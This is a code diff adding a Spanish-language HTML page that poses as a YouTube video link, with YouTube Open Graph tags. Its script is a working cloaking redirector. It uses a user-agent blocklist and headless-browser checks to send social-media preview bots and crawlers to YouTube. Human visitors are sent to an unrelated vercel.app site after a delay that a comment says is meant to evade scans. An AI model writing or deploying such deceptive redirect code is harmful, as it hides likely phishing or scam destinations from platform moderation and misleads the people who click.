@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta property="og:url"           content="https://www.youtube.com/watch?v=bo8GxsX0uCk" />
+    <meta property="og:type"          content="video.other" />
+    <meta property="og:title"         content="F0t0s – D1skret" />
+    <meta property="og:description"   content="F0t0s – D1skret" />
+    <meta property="og:image"         content="https://i.postimg.cc/13HTjVrN/Gemini-Generated-Image-gtx4nmgtx4nmgtx4.png" />
+
+    <title>Cargando...</title>
+
+    <script>
+        (function() {
+            var youtubeLink = "https://www.youtube.com/watch?v=bo8GxsX0uCk";
+            var destinationLink = "https://alemanises042.vercel.app";
+
+            function checkAccess() {
+                var ua = navigator.userAgent.toLowerCase();
+                
+                // 1. Lista negra de User-Agents (Bots)
+                var bots = [
+                    "facebookexternalhit", "facebot", "facebookplatform", 
+                    "googlebot", "bingbot", "adidxbot", "applebot", 
+                    "twitterbot", "linkedinbot", "embedly", "quora link preview", 
+                    "outbrain", "pinterest/0.", "slackbot", "vkshare", "w3c_validator"
+                ];
+
+                for (var i = 0; i < bots.length; i++) {
+                    if (ua.indexOf(bots[i]) !== -1) return true;
+                }
+
+                // 2. Verificación de Headless Browsers (Bots sin interfaz gráfica)
+                if (navigator.webdriver) return true;
+
+                // 3. Verificación de Lenguaje (Los bots de FB suelen no tener lenguajes definidos o son genéricos)
+                if (!navigator.languages || navigator.languages.length === 0) return true;
+
+                // 4. Verificación de resolución de pantalla (Muchos bots usan 0x0 o 800x600)
+                if (window.screen.width === 0 || window.screen.height === 0) return true;
+
+                return false;
+            }
+
+            // Ejecución
+            if (checkAccess()) {
+                // El Bot se queda con la info de YouTube
+                window.location.replace(youtubeLink);
+            } else {
+                // Se añade un pequeño retraso de 500ms para evadir escaneos ultrarrápidos
+                setTimeout(function() {
+                    window.location.replace(destinationLink);
+                }, 500);
+            }
+        })();
+    </script>
+</head>
+<body>
+    <p>Redirigiendo a <a href="https://www.youtube.com/watch?v=bo8GxsX0uCk">YouTube</a>...</p>
+</body>
+</html>
